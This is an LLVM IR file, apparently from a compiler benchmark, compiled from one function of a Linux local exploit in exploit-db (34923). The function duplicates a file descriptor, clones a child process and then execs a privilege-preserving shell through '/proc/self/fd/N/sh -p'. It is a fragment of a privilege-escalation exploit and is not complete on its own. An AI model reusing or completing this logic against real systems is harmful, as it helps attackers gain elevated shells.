; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_34923.c_child1.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_34923.c_child1.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@evilfd = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"dup\00", align 1
@child2 = common dso_local global i32 0, align 4
@CLONE_FILES = common dso_local global i32 0, align 4
@CLONE_VFORK = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [6 x i8] c"clone\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"Here goes...\0A\00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"/proc/self/fd/%d/sh\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-p\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*)* @child1 to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @child1(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [2048 x i8], align 16
  %4 = alloca [1024 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = call i32 @dup(i32 0)
  store i32 %5, i32* @evilfd, align 4
  %6 = load i32, i32* @evilfd, align 4
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %8, label %10

8:                                                ; preds = %1
  %9 = call i32 @err(i32 1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  br label %10

10:                                               ; preds = %8, %1
  %11 = load i32, i32* @child2, align 4
  %12 = getelementptr inbounds [2048 x i8], [2048 x i8]* %3, i64 0, i64 0
  %13 = load i32, i32* @CLONE_FILES, align 4
  %14 = load i32, i32* @CLONE_VFORK, align 4
  %15 = or i32 %13, %14
  %16 = load i8*, i8** %2, align 8
  %17 = call i32 @clone(i32 %11, i8* %12, i32 %15, i8* %16)
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %21

19:                                               ; preds = %10
  %20 = call i32 @err(i32 1, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  br label %21

21:                                               ; preds = %19, %10
  %22 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  %23 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %24 = load i32, i32* @evilfd, align 4
  %25 = call i32 @sprintf(i8* %23, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0), i32 %24)
  %26 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %27 = call i32 @execl(i8* %26, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32* null)
  %28 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %29 = call i32 @perror(i8* %28)
  ret i32 1
}

declare dso_local i32 @dup(i32) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i32 @clone(i32, i8*, i32, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

declare dso_local i32 @perror(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
